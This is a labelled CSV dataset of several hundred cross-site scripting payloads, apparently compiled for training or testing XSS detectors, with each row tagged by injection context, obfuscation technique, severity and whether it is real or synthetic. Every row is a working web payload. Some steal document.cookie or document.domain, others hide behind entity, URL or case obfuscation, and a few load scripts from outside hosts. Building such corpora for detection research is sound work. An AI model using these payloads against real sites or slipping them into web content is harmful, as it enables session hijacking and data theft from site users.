payload,context,technique,severity,length,source
"<progress onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</progress>",event_handler,none,medium,72,real
"<div oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
""" onmouseenter=prompt(1) """,attribute_escape,synthetic,medium,26,synthetic
<button popovertarget=x>Click me</button><bdo ontoggle=alert(1) popover id=x>AnonKryptiQuz</bdo>,event_handler,none,medium,96,real
<label onpointerover=alert(1) style=display:block>AnonKryptiQuz</label>,event_handler,none,medium,71,real
"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",script_injection,none,medium,71,real
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",js_uri,case_variation,medium,59,real
"<select draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</select>",event_handler,none,medium,70,real
"%22 onerror=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,medium,53,synthetic
"<source onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</source>",event_handler,none,medium,73,real
"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,64,real
"<link ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,89,real
"<dialog oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
""" onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,49,synthetic
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",event_handler,case_variation,medium,88,real
"<set onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></set>",event_handler,none,medium,279,real
"<style>:target {color:red;}</style><body id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></body>",event_handler,none,medium,112,real
"<body onclick=""alert(1)"">AnonKryptiQuz</body>",event_handler,none,medium,45,real
"<area onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</area>",event_handler,none,medium,69,real
"<img/src=a onerror=""windowT[‘alert'|(document.cookie)""/>",event_handler,none,high,56,real
"<i draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</i>",event_handler,none,medium,79,real
"<style>@keyframes slidein {}</style><audio style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></audio>",event_handler,none,medium,170,real
"<style>@keyframes slidein {}</style><sub style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></sub>",event_handler,none,medium,166,real
"' onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,73,synthetic
<body onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"""><svg onfocus=confirm('XSS')>",tag_injection,synthetic,medium,30,synthetic
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationend=""alert(1)""></caption>",event_handler,none,medium,99,real
<header onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</header><input value=clickme>,event_handler,none,medium,112,real
"<svg onlo&#97;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,64,synthetic
"<element onmouseout=""alert(1)"">AnonKryptiQuz</element>",event_handler,none,medium,54,real
"""`'><script>\x0Bjavascript:alert(1)</script>",script_injection,none,medium,44,real
'+ '</b><script>alert(document.cookie)</script><b><!--',script_injection,none,high,55,real
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=print()></frameset>",event_handler,none,low,118,real
"""><svg onload=\u0061lert(1)>",tag_injection,synthetic,medium,28,synthetic
' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(1) ',attribute_escape,synthetic,medium,49,synthetic
"<style>@keyframes slidein {}</style><select style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></select>",event_handler,none,medium,166,real
<shadow onpointerdown=alert(1) style=display:block>AnonKryptiQuz</shadow>,event_handler,none,medium,73,real
"<hgroup onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</hgroup>",event_handler,none,medium,85,real
"<hr onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,63,real
"<address draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</address>",event_handler,none,medium,70,real
<svG oNtoGglE=cOnsOle.loG(1)>,tag_injection,synthetic,medium,29,synthetic
"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(9910)"">DEF",js_uri,none,medium,67,real
"<canvas onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",event_handler,none,medium,65,real
"<style>@keyframes x{}</style><a style=""animation-name:x"" onanimationstart=""alert(1)""></a>",event_handler,none,medium,89,real
"<ruby onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",event_handler,none,medium,61,real
' oNfoCus=coNfiRm(DocUmeNt.DomAin) ',attribute_escape,synthetic,medium,36,synthetic
<svg onfocus=alert('XSS')>,tag_injection,synthetic,medium,26,synthetic
"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",event_handler,none,medium,89,real
<script>location='javascript:alert\x281\x29'</script>,script_injection,none,low,53,real
%22 onclick=console.log(1) %22,attribute_escape,synthetic,medium,30,synthetic
"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>",event_handler,none,medium,156,real
"<noframes onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",event_handler,none,medium,69,real
"<image2 onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",event_handler,none,medium,74,real
<svg onclick=alert(1)>,tag_injection,synthetic,medium,22,synthetic
""" oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
<sup contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,57,real
"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",dom_sink,html_entity|whitespace_obfuscation,low,86,real
"<style>@keyframes x{}</style><a2 style=""animation-name:x"" onanimationstart=""alert(1)""></a2>",event_handler,none,medium,91,real
"%20""><img src=q onerror=alert(1)>",event_handler,url_encoding,medium,33,real
"<spacer onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",event_handler,none,medium,74,real
"<h1 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</h1>",event_handler,none,medium,85,real
<footer onpointerout=alert(1) style=display:block>AnonKryptiQuz</footer>,event_handler,none,medium,72,real
"<style>:target {color:red;}</style><animatetransform id=x style=""transition:color 1s"" ontransitionstart=alert(1)></animatetransform>",event_handler,none,medium,132,real
""" onb&#101;gin=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,60,synthetic
%22%3E'><script>alert(2);</script>,script_injection,url_encoding,medium,34,real
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,script_injection,comment_injection,low,64,real
"='><script>alert(""xss"")</script>",script_injection,none,medium,32,real
<shadow onpointerup=alert(1) style=display:block>AnonKryptiQuz</shadow>,event_handler,none,medium,71,real
""" oNmoUseOveR=aLerT(dOcuMenT.dOmaIn) """,attribute_escape,synthetic,medium,38,synthetic
"<p onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</p>",event_handler,none,medium,63,real
"""><svg onerror=console.log(document.domain)>",tag_injection,synthetic,medium,44,synthetic
%3Csvg onbegin=console.log(1)%3E,tag_injection,synthetic,medium,32,synthetic
%22><svg onclick=prompt(%27XSS%27)>,tag_injection,synthetic,medium,35,synthetic
#javascript:alert(1),js_uri,none,medium,20,real
"<bdo ondblclick=""alert(1)"">AnonKryptiQuz</bdo>",event_handler,none,medium,46,real
<keygen onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<span onblur=alert(1) tabindex=1 id=x></span><input autofocus>,event_handler,none,medium,62,real
"<colgroup onclick=""alert(1)"">AnonKryptiQuz</colgroup>",event_handler,none,medium,53,real
"""><script+src=""https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)""></script>",script_injection,none,medium,112,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><template id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></template>",event_handler,none,medium,186,real
"<address draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</address>",event_handler,none,medium,67,real
<button popovertarget=x>Click me</button><em onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</em>,event_handler,none,medium,100,real
"<label draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</label>",event_handler,none,medium,68,real
"<IMG STYLE=""xss:expr/*AnonKryptiQuz*/ession(javascript:alert(1))"">",js_uri,comment_injection|case_variation,medium,66,real
"<kbd oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
javascript:void(prompt(document.cookie)),js_uri,synthetic,medium,40,synthetic
"<isindex draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</isindex>",event_handler,none,medium,72,real
"<head draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</head>",event_handler,none,medium,66,real
"<canvas onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</canvas>",event_handler,none,medium,70,real
<tt onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
<code onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</code><input value=clickme>,event_handler,none,medium,99,real
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationend=""alert(1)""></menuitem>",event_handler,none,medium,101,real
"<body oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sup id=x style=""position:absolute;"" onanimationcancel=""print()""></sup>",event_handler,none,low,175,real
<img src=1 onerror=print()>,event_handler,none,low,27,real
"<content ondblclick=""alert(1)"">AnonKryptiQuz</content>",event_handler,none,medium,54,real
"<style>@keyframes slidein {}</style><keygen style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></keygen>",event_handler,none,medium,166,real
' onload=confirm(location.hash) ',attribute_escape,synthetic,medium,33,synthetic
"<style>:target {color:red;}</style><textarea id=x style=""transition:color 1s"" ontransitionend=alert(1)></textarea>",event_handler,none,medium,114,real
"EvaL(""AleRt('XSS')"")",dom_sink,synthetic,medium,20,synthetic
javascript:void(console.log(location.hash)),js_uri,synthetic,medium,43,synthetic
"<output onmouseleave=""alert(1)"">AnonKryptiQuz</output>",event_handler,none,medium,54,real
<button popovertarget=x>Click me</button><input2 ontoggle=alert(1) popover id=x>AnonKryptiQuz</input2>,event_handler,none,medium,102,real
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,event_handler,none,medium,55,real
%3C%25%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29%3B%3E,generic,url_encoding,low,135,real
"<style>:target {color:red;}</style><listing id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></listing>",event_handler,none,medium,118,real
"\""));}catch(e){confirm(document.domain);}//",dom_sink,none,medium,43,real
"<style><img src=""</style><img src=x onerror=alert(XSS)//"">",event_handler,none,medium,58,real
<svg onlo&#97;d=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,51,synthetic
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationend=""alert(1)""></label>",event_handler,none,medium,95,real
"<nextid onclick=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",event_handler,none,medium,69,real
"<ol ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</ol>",event_handler,none,medium,85,real
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onwebkitanimationend=""alert(1)""></meter>",event_handler,none,medium,101,real
"<ul onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",event_handler,none,medium,65,real
<script>console.log`1`</script>,script_injection,synthetic,medium,31,synthetic
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>,event_handler,none,medium,53,real
"<shadow onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</shadow>",event_handler,none,medium,65,real
"<fieldset oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</fieldset>",event_handler,none,medium,68,real
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>,event_handler,none,medium,57,real
<BODY ONLOAD=alert(’XSS’)>,event_handler,case_variation,medium,26,real
"<b draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</b>",event_handler,none,medium,80,real
"&lt;STYLE&gt;BODY{-moz-binding&#58;url(\""http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\"")}&lt;/STYLE&gt;",generic,html_entity,low,109,real
"<img onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</img>",event_handler,none,medium,66,real
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,tag_injection,html_entity|case_variation,low,136,real
' onload=\u0061lert(1) ',attribute_escape,synthetic,medium,24,synthetic
%27 onfocus=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,32,synthetic
"<div id=""87""><svg xmlns=""http://www.w3.org/2000/svg"">",tag_injection,none,low,53,real
""" on&#101;rror=prompt(1) """,attribute_escape,synthetic,medium,26,synthetic
%3Csvg onload=prompt(document.domain)/%3E,tag_injection,synthetic,medium,41,synthetic
<xss onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
' onerror=prompt(location.hash) ',attribute_escape,synthetic,medium,33,synthetic
<ul onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<div draggable=""true"" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>",event_handler,none,medium,105,real
"<style>:target {color:red;}</style><nav id=x style=""transition:color 1s"" ontransitionend=alert(1)></nav>",event_handler,none,medium,104,real
<svg/&parameter=onload=alert()>,event_handler,none,medium,31,real
"<image3 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",event_handler,none,medium,89,real
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,68,real
<summary onpointerenter=alert(1) style=display:block>AnonKryptiQuz</summary>,event_handler,none,medium,76,real
"window.name=""javascript:confirm((window.opener||window).document.cookie);"";",js_uri,none,high,75,real
<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>,event_handler,none,medium,55,real
"""><script+src=""https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)""></script>",script_injection,none,medium,90,real
<style onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,67,real
"<wbr onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",event_handler,none,medium,67,real
javascript&colon;alert(1),generic,none,medium,25,real
<h1 onpointerout=alert(1) style=display:block>AnonKryptiQuz</h1>,event_handler,none,medium,64,real
"<svG oNmoUseOveR=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<details onmouseleave=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,56,real
"<script>/x/console.log(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,medium,62,synthetic
alert&#x28;1&#x29,generic,html_entity,low,17,real
"<s onmousedown=""alert(1)"">AnonKryptiQuz</s>",event_handler,none,medium,43,real
"<plaintext oncontextmenu=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,61,real
"""><svg onerror=prompt(document.domain)>",tag_injection,synthetic,medium,39,synthetic
嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E,dom_sink,url_encoding,low,61,real
J&#97;VasCriPt:ProMpt(doCumEnt.doMaiN),js_uri,synthetic,medium,38,synthetic
"<mark draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</mark>",event_handler,none,medium,61,real
%3Csvg ontoggle=prompt(1)/%3E,tag_injection,synthetic,medium,29,synthetic
%27 onerror=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,32,synthetic
AnonKryptiQuz@example(<script>alert(0)</script>).com,script_injection,none,medium,52,real
""" on&#101;rror=confirm(1) """,attribute_escape,synthetic,medium,27,synthetic
"<map onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</map>",event_handler,none,medium,59,real
<strike onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</strike><input value=clickme>,event_handler,none,medium,112,real
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onwebkitanimationend=""alert(1)""></samp>",event_handler,none,medium,99,real
"<em onclick=""alert(1)"" style=display:block>AnonKryptiQuz</em>",event_handler,none,medium,61,real
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",event_handler,none,medium,113,real
"<i draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,55,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""print()""></del>",event_handler,none,low,175,real
"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable style=display:block>drop here</head>",event_handler,none,medium,129,real
<img onload=alert(1)>//INJECTX,event_handler,none,medium,30,real
"<kbd onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</kbd>",event_handler,none,medium,65,real
<s onpointerdown=alert(1) style=display:block>AnonKryptiQuz</s>,event_handler,none,medium,63,real
<svg onbegin=alert('XSS')>,tag_injection,synthetic,medium,26,synthetic
"""><svg onload=prompt(document.domain);>.php",event_handler,none,medium,43,real
"<style>:target {color:red;}</style><bdo id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></bdo>",event_handler,none,medium,110,real
"<caption draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</caption>",event_handler,none,medium,72,real
"s&#101;tTim&#101;out(""prompt(1)"",0)",dom_sink,synthetic,medium,35,synthetic
"<style>@keyframes x{}</style><set style=""animation-name:x"" onanimationend=""alert(1)""></set>",event_handler,none,medium,91,real
<rt onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</rt><input value=clickme>,event_handler,none,medium,104,real
"<picture onmousedown=""alert(1)"">AnonKryptiQuz</picture>",event_handler,none,medium,55,real
"""><svg onerror=console.log(1)>",tag_injection,synthetic,medium,30,synthetic
<details id=x tabindex=1 onfocus=alert(1)></details>,event_handler,none,medium,52,real
"<big ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</big>",event_handler,none,medium,87,real
<p onpointerdown=alert(1) style=display:block>AnonKryptiQuz</p>,event_handler,none,medium,63,real
"<map onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</map>",event_handler,none,medium,65,real
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,script_injection,case_variation,low,44,real
"<link onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,83,real
""" onbegin=\u0061lert(1) """,attribute_escape,synthetic,medium,25,synthetic
"<source onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</source>",event_handler,none,medium,85,real
"<script ="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",script_injection,none,low,66,real
""" onfocus=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,66,synthetic
'''><SCRIPT>alert(1)',script_injection,case_variation,medium,21,real
"<style>:target {color: red;}</style><nextid id=x style=""transition:color 10s"" ontransitioncancel=print()></nextid>",event_handler,none,low,114,real
"<style>@keyframes x{}</style><td style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></td>",event_handler,none,medium,97,real
%E5%98%8D%E5%98%8A%20<img/src/onerror=alert(AnonKryptiQuz`)>,event_handler,url_encoding,medium,60,real
"""><Svg onMouSeoVer=prOmpT(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,41,synthetic
"<datalist onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</datalist>",event_handler,none,medium,77,real
"<script>prompt`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection,synthetic,medium,63,synthetic
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationend=""alert(1)""></details>",event_handler,none,medium,99,real
"<img onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</img>",event_handler,none,medium,65,real
<img2 onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</img2>,event_handler,none,medium,74,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></nav>",event_handler,none,medium,176,real
"<meta oncontextmenu=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,51,real
"<rt onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</rt>",event_handler,none,medium,60,real
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable style=display:block>drop here</dir>",event_handler,none,medium,123,real
"&lt;&lt;SCRIPT&gt;alert(\""AnonKryptiQuz\"");//&lt;&lt;/SCRIPT&gt;",generic,none,medium,64,real
"<STYLE>li {list-style-image: url(""javascript:alert('AnonKryptiQuz')"");}</STYLE><UL><LI>AnonKryptiQuz</br>",js_uri,case_variation,medium,105,real
<a2 onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
<IMG SRC=”javascript:alert(‘XSS’);”>,js_uri,case_variation,medium,36,real
<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>,event_handler,none,medium,70,real
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,event_handler,none,medium,79,real
"<meta onmouseup=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,47,real
"EvaL(""ProMpt(doCumEnt.doMaiN)"")",dom_sink,synthetic,medium,31,synthetic
"<option onmousemove=""alert(1)"">AnonKryptiQuz</option>",event_handler,none,medium,53,real
"<kbd onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></kbd>",event_handler,none,medium,279,real
%3Csvg onmouseenter=console.log(document.cookie)%3E,tag_injection,synthetic,medium,51,synthetic
"""><img src=1 onerror=alert&#x000000028;1&#x000000029;&#x00000003B;"">",event_handler,html_entity,low,68,real
"""><svg ontoggle=alert(location.hash)>",tag_injection,synthetic,medium,37,synthetic
"""><svg onclick=console.log(document.domain)>",tag_injection,synthetic,medium,44,synthetic
""" onclick=prompt(document.cookie) """,attribute_escape,synthetic,medium,35,synthetic
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,event_handler,none,medium,47,real
' onmous&#101;ov&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,63,synthetic
"<dialog onmouseenter=""alert(1)"">AnonKryptiQuz</dialog>",event_handler,none,medium,54,real
<img src=asdf onerror=alert(document.cookie)>,event_handler,none,high,45,real
"' onclick=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape,synthetic,medium,66,synthetic
"<s onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</s>",event_handler,none,medium,60,real
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable style=display:block>drop here</optgroup>",event_handler,none,medium,137,real
<svg onmouseover=alert(%27XSS%27)/>,tag_injection,synthetic,medium,35,synthetic
"<kbd draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,84,real
<svG oNfoCus=alErt(doCumEnt.doMaiN)/>,tag_injection,synthetic,medium,37,synthetic
"s&#101;tTim&#101;out(""confirm(docum&#101;nt.dom&#97;in)"",0)",dom_sink,synthetic,medium,59,synthetic
"<shadow onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</shadow>",event_handler,none,medium,72,real
"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",event_handler,none,medium,170,real
"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(6966);/*';"">DEF",js_uri,none,medium,85,real
%22 onload=alert(location.hash) %22,attribute_escape,synthetic,medium,35,synthetic
"<small draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</small>",event_handler,none,medium,66,real
"<param draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</param>",event_handler,none,medium,63,real
"<wbr onmouseover=""alert(1)"">AnonKryptiQuz</wbr>",event_handler,none,medium,47,real
<ol onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
<svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(1)/>,tag_injection,synthetic,medium,54,synthetic
""" oNerRor=coNsoLe.Log(doCumEnt.coOkiE) """,attribute_escape,synthetic,medium,40,synthetic
"<map ondblclick=""alert(1)"">AnonKryptiQuz</map>",event_handler,none,medium,46,real
"<i oncontextmenu=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,45,real
"""`'><script>\xEF\xBB\xBFjavascript:alert(8282)</script>",script_injection,none,medium,55,real
"<meta onmousedown=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,49,real
"<style>@keyframes x{}</style><marquee style=""animation-name:x"" onanimationstart=""alert(1)""></marquee>",event_handler,none,medium,101,real
"<applet onclick=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",event_handler,none,medium,69,real
"%3Csvg onfocus=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,56,synthetic
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationstart=""alert(1)""></audio>",event_handler,none,medium,97,real
"<style>@keyframes x{}</style><head style=""animation-name:x"" onwebkitanimationend=""alert(1)""></head>",event_handler,none,medium,99,real
"<dialog ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,93,real
"""><img src=""/"" =_="" title=""onerror='prompt(1)'"">",event_handler,none,medium,48,real
"<image2 onclick=""alert(1)"" style=display:block>AnonKryptiQuz</image2>",event_handler,none,medium,69,real
"<template oncontextmenu=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,59,real
<th id=x tabindex=1 onfocus=alert(1)></th>,event_handler,none,medium,42,real
